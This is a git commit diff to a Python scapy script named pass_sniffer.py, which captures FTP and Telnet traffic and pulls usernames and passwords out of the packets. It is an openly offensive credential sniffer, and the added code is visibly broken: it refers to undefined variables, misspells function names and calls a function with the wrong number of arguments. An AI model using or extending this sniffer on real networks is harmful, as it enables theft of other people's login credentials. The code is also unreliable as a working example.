b82072d1379bb4f679ff528b77f6e6e995394ace
lapis-zero09 <shandy1124gaff@gmail.com>
2017-03-08 16:35:49 +0900

    capture_telnet

--- pass_sniffer.py
+++ pass_sniffer.py
@@ -7,7 +7,7 @@ from scapy.all import *
 
 
 def check_packet_detail(packet):
-    if packet.haslayer(TCP) and packet.haslayer(Raw):
+    if packet.haslayer(TCP) and packet.haslayer(IP):
         if packet[TCP].dport == 21 or packet[TCP].sport == 21:
             return 'FTP'
         elif packet[TCP].dport == 23 or packet[TCP].sport == 23:
@@ -15,17 +15,66 @@ def check_packet_detail(packet):
         else:
             return False
 
+def capture_ftp(data):
+    if 'user' in data.lower() or 'pass' in data.lower():
+        print("\t[*] Server: %s -> %s" % (packet[IP].src, packet[IP].dst))
+        print("\t  [*] %s" % packet[TCP].payload)
+
+def caputure_telnet(src_ip_port, dst_ip_port, data, ack, seq):
+    global telnet_stream
+    msg = None
+
+    if src_ip_port in telnet_stream:
+        # Do a utf decode in case the client sends telnet options before their username
+        # No one would care to see that
+        try:
+            telnet_stream[src_ip_port] += load.decode('utf8')
+        except UnicodeDecodeError:
+            pass
+
+        # \r or \r\n or \n terminate commands in telnet if my pcaps are to be believed
+        if '\r' in telnet_stream[src_ip_port] or '\n' in telnet_stream[src_ip_port]:
+            telnet_split = telnet_stream[src_ip_port].split(' ', 1)
+            cred_type = telnet_split[0]
+            value = telnet_split[1].replace('\r\n', '').replace('\r', '').replace('\n', '')
+            # Create msg, the return variable
+            msg = 'Telnet %s: %s' % (cred_type, value)
+            printer(src_ip_port, dst_ip_port, msg)
+            del telnet_stream[src_ip_port]
+
+    # This part relies on the telnet packet ending in
+    # "login:", "password:", or "username:" and being <750 chars
+    # Haven't seen any false+ but this is pretty general
+    # might catch some eventually
+    # maybe use dissector.py telnet lib?
+    if len(telnet_stream) > 100:
+        telnet_stream.popitem(last=False)
+    mod_load = load.lower().strip()
+    if mod_load.endswith('username:') or mod_load.endswith('login:'):
+        telnet_stream[dst_ip_port] = 'username '
+    elif mod_load.endswith('password:'):
+        telnet_stream[dst_ip_port] = 'password '
+
+
 def check_packet(packet):
     app = check_packet_detail(packet)
     if app:
         pass
     else:
         return
+
+    ack = str(pkt[TCP].ack)
+    seq = str(pkt[TCP].seq)
+    src_ip_port = str(pkt[IP].src) + ':' + str(pkt[TCP].sport)
+    dst_ip_port = str(pkt[IP].dst) + ':' + str(pkt[TCP].dport)
+    # frag_remover(ack, load)
+    # pkt_frag_loads[src_ip_port] = frag_joiner(ack, src_ip_port, load)
     data = packet[Raw].load
-    if 'user' in data.lower() or 'pass' in data.lower():
-        print('[*] %s packet capture was successful' % app)
-        print("\t[*] Server: %s -> %s" % (packet[IP].dst, packet[IP].src))
-        print("\t  [*] %s" % packet[TCP].payload)
+    print('[*] %s packet capture was successful' % app)
+    if app == 'FTP':
+        caputure_ftp(data)
+    elif app == 'Telnet':
+        caputure_telnet(data)
 
 if __name__ == '__main__':
     print('[*] Sniffing Started ...')
